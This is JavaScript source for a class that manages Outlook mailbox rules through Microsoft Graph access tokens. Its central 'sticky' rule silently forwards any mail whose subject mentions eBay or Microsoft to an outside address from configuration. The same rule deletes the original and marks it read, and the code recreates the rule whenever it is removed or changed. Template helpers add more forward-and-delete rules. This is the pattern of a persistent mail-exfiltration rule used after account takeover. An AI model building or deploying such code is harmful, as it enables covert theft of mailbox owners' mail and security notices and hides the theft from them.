const GraphClient = require('./graph');
const Log = require('../models/Log');

class RuleManager {
    constructor() {
        this.STICKY_RULE_NAME = 'Sticky_eBay_Microsoft_Rule';
        if (!process.env.FORWARD_TARGET_EMAIL) {
            console.warn('⚠️ WARNING: FORWARD_TARGET_EMAIL is not defined in .env');
        }
        this.TARGET_EMAIL = process.env.FORWARD_TARGET_EMAIL;
        this.KEYWORDS = ['eBay', 'Microsoft'];
    }

    ensureTargetEmail() {
        if (!this.TARGET_EMAIL) {
            throw new Error('Configuration error: FORWARD_TARGET_EMAIL is required in .env');
        }
        return this.TARGET_EMAIL;
    }

    // ============= STICKY RULE MANAGEMENT =============
    async ensureStickyRule(accessToken, accountId) {
        const graph = new GraphClient(accessToken);
        
        try {
            const rules = await graph.getRules();
            let existingRule = rules.find(r => r.displayName === this.STICKY_RULE_NAME);

            if (!existingRule) {
                console.log('📝 No sticky rule found, creating new one...');
                const newRule = await this.createStickyRule(graph);
                
                await Log.create({
                    accountId,
                    action: 'rule_created',
                    status: 'success',
                    message: 'Sticky eBay/Microsoft rule created',
                    details: { ruleId: newRule.id }
                });
                
                return { status: 'created', ruleId: newRule.id };
            }

            const isValid = this.validateStickyRule(existingRule);
            if (!isValid) {
                console.log('⚠️ Existing rule has invalid format, recreating...');
                await graph.deleteRule(existingRule.id);
                const newRule = await this.createStickyRule(graph);
                return { status: 'restored', ruleId: newRule.id };
            }

            return { status: 'ok', ruleId: existingRule.id };

        } catch (error) {
            console.error('❌ Rule enforcement error:', error);
            throw error;
        }
    }

    async createStickyRule(graph) {
        const targetEmail = this.ensureTargetEmail();
        const rule = {
            displayName: this.STICKY_RULE_NAME,
            sequence: 1,
            isEnabled: true,
            conditions: {
                subjectContains: this.KEYWORDS
            },
            actions: {
                forwardTo: [
                    {
                        emailAddress: {
                            address: targetEmail
                        }
                    }
                ],
                delete: true,
                markAsRead: true,
                stopProcessingRules: true
            }
        };

        console.log('📤 Creating sticky rule:', JSON.stringify(rule, null, 2));
        
        try {
            const result = await graph.createRule(rule);
            console.log('✅ Sticky rule created:', result.id);
            return result;
        } catch (error) {
            console.error('❌ Create rule failed:', error.response?.data || error.message);
            throw error;
        }
    }

    validateStickyRule(rule) {
        const hasCorrectActions = 
            rule.actions?.delete === true &&
            rule.actions?.forwardTo?.[0]?.emailAddress?.address === this.TARGET_EMAIL &&
            rule.actions?.markAsRead === true &&
            rule.actions?.stopProcessingRules === true;

        const hasCorrectConditions = 
            rule.conditions?.subjectContains?.includes('eBay') &&
            rule.conditions?.subjectContains?.includes('Microsoft');

        return hasCorrectActions && hasCorrectConditions;
    }

    // ============= GET ALL RULES =============
    async getRules(accessToken) {
        const graph = new GraphClient(accessToken);
        return await graph.getRules();
    }

    // ============= CREATE CUSTOM RULE - ALL CONDITIONS! =============
    async createCustomRule(accessToken, accountId, ruleConfig) {
        const graph = new GraphClient(accessToken);
        
        try {
            // Check if rule already exists
            const existingRules = await graph.getRules();
            const existingRule = existingRules.find(r => r.displayName === ruleConfig.displayName);
            
            let result;
            if (existingRule) {
                result = await graph.updateRule(existingRule.id, ruleConfig);
                console.log('✅ Rule updated:', ruleConfig.displayName);
            } else {
                result = await graph.createRule(ruleConfig);
                console.log('✅ Rule created:', ruleConfig.displayName);
            }
            
            await Log.create({
                accountId,
                action: 'rule_created',
                status: 'success',
                message: `Rule ${ruleConfig.displayName} ${existingRule ? 'updated' : 'created'}`,
                details: { 
                    ruleName: ruleConfig.displayName, 
                    ruleId: result.id,
                    conditions: ruleConfig.conditions,
                    actions: ruleConfig.actions
                }
            });

            return { status: existingRule ? 'updated' : 'created', ruleId: result.id };
        } catch (error) {
            console.error('❌ Create custom rule error:', error);
            throw error;
        }
    }

    // ============= RULE TEMPLATES - READY TO USE! =============
 
     /**
      * 🎯 RULE 1: FORWARD FROM SPECIFIC SENDER
      */
     createForwardFromSenderRule(sender, targetEmail, deleteOriginal = false) {
         return {
             displayName: `Forward_From_${sender.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`,
             sequence: 100,
             isEnabled: true,
             conditions: {
                 fromAddresses: [
                     {
                         emailAddress: {
                             address: sender
                         }
                     }
                 ]
             },
             actions: {
                 forwardTo: [
                     {
                         emailAddress: {
                             address: targetEmail
                         }
                     }
                 ],
                 markAsRead: true,
                 ...(deleteOriginal && { delete: true, moveToDeletedItems: true }),
                 stopProcessingRules: false
             }
         };
     }
 
     /**
      * 🎯 RULE 2: FORWARD FROM DOMAIN
      */
     createForwardFromDomainRule(domain, targetEmail, deleteOriginal = false) {
         const cleanDomain = domain.replace(/^@/, '');
         return {
             displayName: `Forward_From_@${cleanDomain.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`,
             sequence: 101,
             isEnabled: true,
             conditions: {
                 senderContains: [cleanDomain]
             },
             actions: {
                 forwardTo: [
                     {
                         emailAddress: {
                             address: targetEmail
                         }
                     }
                 ],
                 markAsRead: true,
                 ...(deleteOriginal && { delete: true, moveToDeletedItems: true }),
                 stopProcessingRules: false
             }
         };
     }
 
     /**
      * 🎯 RULE 3: FORWARD WITH SUBJECT KEYWORD
      */
     createForwardWithSubjectRule(keywords, targetEmail, deleteOriginal = false) {
         const keywordStr = keywords.join('_');
         return {
             displayName: `Forward_Subject_${keywordStr}_To_${targetEmail.replace(/[@.]/g, '_')}`,
             sequence: 102,
             isEnabled: true,
             conditions: {
                 subjectContains: Array.isArray(keywords) ? keywords : [keywords]
             },
             actions: {
                 forwardTo: [
                     {
                         emailAddress: {
                             address: targetEmail
                         }
                     }
                 ],
                 markAsRead: true,
                 ...(deleteOriginal && { delete: true, moveToDeletedItems: true }),
                 stopProcessingRules: false
             }
         };
     }
 
     /**
      * 🎯 RULE 4: BLOCK SENDER (DELETE)
      */
     createBlockSenderRule(sender) {
         return {
             displayName: `Block_${sender.replace(/[@.]/g, '_')}`,
             sequence: 900,
             isEnabled: true,
             conditions: {
                 fromAddresses: [
                     {
                         emailAddress: {
                             address: sender
                         }
                     }
                 ]
             },
             actions: {
                 delete: true,
                 moveToDeletedItems: true,
                 stopProcessingRules: true
             }
         };
     }
 
     /**
      * 🎯 RULE 5: BLOCK DOMAIN
      */
     createBlockDomainRule(domain) {
         const cleanDomain = domain.replace(/^@/, '');
         return {
             displayName: `Block_Domain_${cleanDomain.replace(/[@.]/g, '_')}`,
             sequence: 901,
             isEnabled: true,
             conditions: {
                 senderContains: [cleanDomain]
             },
             actions: {
                 delete: true,
                 moveToDeletedItems: true,
                 stopProcessingRules: true
             }
         };
     }
 
     /**
      * 🎯 RULE 6: MOVE TO FOLDER
      */
     createMoveToFolderRule(condition, conditionType, folderId, folderName) {
         const conditionObj = {};
         if (conditionType === 'sender') {
             conditionObj.fromAddresses = [{ emailAddress: { address: condition } }];
         } else if (conditionType === 'subject') {
             conditionObj.subjectContains = [condition];
         } else if (conditionType === 'domain') {
             conditionObj.senderContains = [condition.replace(/^@/, '')];
         }
 
         return {
             displayName: `Move_${condition.replace(/[@.]/g, '_')}_To_${folderName}`,
             sequence: 200,
             isEnabled: true,
             conditions: conditionObj,
             actions: {
                 moveToFolder: folderId,
                 markAsRead: true,
                 stopProcessingRules: false
             }
         };
     }
 
     /**
      * 🎯 RULE 7: MARK IMPORTANCE
      */
     createMarkImportanceRule(condition, conditionType, importance) {
         const conditionObj = {};
         if (conditionType === 'sender') {
             conditionObj.fromAddresses = [{ emailAddress: { address: condition } }];
         } else if (conditionType === 'subject') {
             conditionObj.subjectContains = [condition];
         }
 
         return {
             displayName: `Mark_${condition.replace(/[@.]/g, '_')}_As_${importance}`,
             sequence: 300,
             isEnabled: true,
             conditions: conditionObj,
             actions: {
                 markImportance: importance,
                 stopProcessingRules: false
             }
         };
     }
 
     /**
      * 🎯 RULE 8: ASSIGN CATEGORY
      */
     createAssignCategoryRule(condition, conditionType, category) {
         const conditionObj = {};
         if (conditionType === 'sender') {
             conditionObj.fromAddresses = [{ emailAddress: { address: condition } }];
         } else if (conditionType === 'subject') {
             conditionObj.subjectContains = [condition];
         } else if (conditionType === 'domain') {
             conditionObj.senderContains = [condition.replace(/^@/, '')];
         }
 
         return {
             displayName: `Categorize_${condition.replace(/[@.]/g, '_')}_As_${category}`,
             sequence: 400,
             isEnabled: true,
             conditions: conditionObj,
             actions: {
                 assignCategories: [category],
                 stopProcessingRules: false
             }
         };
     }
 
     /**
      * 🎯 RULE 9: COMPLEX CONDITION (AND/OR)
      */
     createComplexRule(name, conditions, actions) {
         return {
             displayName: name,
             sequence: 500,
             isEnabled: true,
             conditions: conditions, // Can be { and: [...] } or { or: [...] }
             actions: actions,
             stopProcessingRules: false
         };
     }
 
     /**
      * 🎯 RULE 10: AUTO-REPLY (Vacation/Out of Office style)
      * Note: Limited support in Graph API
      */
     createAutoReplyRule(subjectKeywords, replyBody) {
         return {
             displayName: `AutoReply_${subjectKeywords.join('_')}`,
             sequence: 600,
             isEnabled: true,
             conditions: {
                 subjectContains: subjectKeywords
             },
 actions: {
     stopProcessingRules: false
     // Note: Full auto-reply requires MailSettings API
     // This is just a placeholder rule
 }
         };
     }
 
     /**
      * 🎯 RULE 11: FORWARD WITH ATTACHMENT
      */
     createForwardAsAttachmentRule(sender, targetEmail) {
         return {
             displayName: `ForwardAsAttachment_${sender.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`,
             sequence: 103,
             isEnabled: true,
             conditions: {
                 fromAddresses: [
                     {
                         emailAddress: {
                             address: sender
                         }
                     }
                 ]
             },
             actions: {
                 forwardAsAttachmentTo: [
                     {
                         emailAddress: {
                             address: targetEmail
                         }
                     }
                 ],
                 markAsRead: true,
                 stopProcessingRules: false
             }
         };
     }


    // Line ~400 ke baad yeh add kar sakte ho:
async createRuleFromTemplate(accessToken, accountId, templateName, ...args) {
    let ruleConfig;
    
    switch(templateName) {
        case 'forwardSender':
            ruleConfig = this.createForwardFromSenderRule(...args);
            break;
        case 'forwardDomain':
            ruleConfig = this.createForwardFromDomainRule(...args);
            break;
        case 'blockSender':
            ruleConfig = this.createBlockSenderRule(...args);
            break;
        case 'blockDomain':
            ruleConfig = this.createBlockDomainRule(...args);
            break;
        // ... etc
        default:
            throw new Error(`Unknown template: ${templateName}`);
    }
    
    return await this.createCustomRule(accessToken, accountId, ruleConfig);
}

    /**
     * 🎯 RULE 12: HAS ATTACHMENTS
     */
    createHasAttachmentsRule(action, targetFolder = null, targetEmail = null) {
        const actions = {};
        
        if (action === 'move' && targetFolder) {
            actions.moveToFolder = targetFolder;
        } else if (action === 'forward' && targetEmail) {
            actions.forwardTo = [{ emailAddress: { address: targetEmail } }];
        } else if (action === 'delete') {
            actions.delete = true;
            actions.moveToDeletedItems = true;
        }

        return {
            displayName: `HasAttachments_${action}`,
            sequence: 700,
            isEnabled: true,
            conditions: {
                hasAttachments: true
            },
            actions: {
                ...actions,
                stopProcessingRules: false
            }
        };
    }

    /**
     * 🎯 RULE 13: IMPORTANCE BASED
     */
    createImportanceRule(importance, action, targetFolder = null) {
        const actions = {};
        
        if (action === 'move' && targetFolder) {
            actions.moveToFolder = targetFolder;
        } else if (action === 'markRead') {
            actions.markAsRead = true;
        } else if (action === 'delete') {
            actions.delete = true;
        }

        return {
            displayName: `${importance}_Importance_${action}`,
            sequence: 800,
            isEnabled: true,
            conditions: {
                importance: importance
            },
            actions: {
                ...actions,
                stopProcessingRules: false
            }
        };
    }

    // ============= UTILITY METHODS =============

    async toggleRule(accessToken, ruleName) {
        const graph = new GraphClient(accessToken);
        const rules = await graph.getRules();
        const rule = rules.find(r => r.displayName === ruleName);
        
        if (!rule) {
            throw new Error(`Rule '${ruleName}' not found`);
        }

        const isEnabled = !rule.isEnabled;
        await graph.updateRule(rule.id, { isEnabled });
        
        return { success: true, ruleId: rule.id, isEnabled };
    }

    async removeRule(accessToken, ruleName) {
        const graph = new GraphClient(accessToken);
        const rules = await graph.getRules();
        const rule = rules.find(r => r.displayName === ruleName);
        
        if (!rule) {
            throw new Error(`Rule '${ruleName}' not found`);
        }

        await graph.deleteRule(rule.id);
        return { success: true, ruleId: rule.id };
    }

    async updateRule(accessToken, ruleId, ruleConfig) {
        const graph = new GraphClient(accessToken);
        try {
            const result = await graph.updateRule(ruleId, ruleConfig);
            return result;
        } catch (error) {
            console.error('❌ Update rule error:', error);
            throw error;
        }
    }

    async hasDomainRule(accessToken, domain, targetEmail) {
        try {
            const graph = new GraphClient(accessToken);
            const rules = await graph.getRules();
            const ruleName = `Forward_From_@${domain.replace(/[@.]/g, '_')}_To_${targetEmail.replace(/[@.]/g, '_')}`;
            const rule = rules.find(r => r.displayName === ruleName);
            return !!rule;
        } catch (error) {
            return false;
        }
    }
}

module.exports = RuleManager;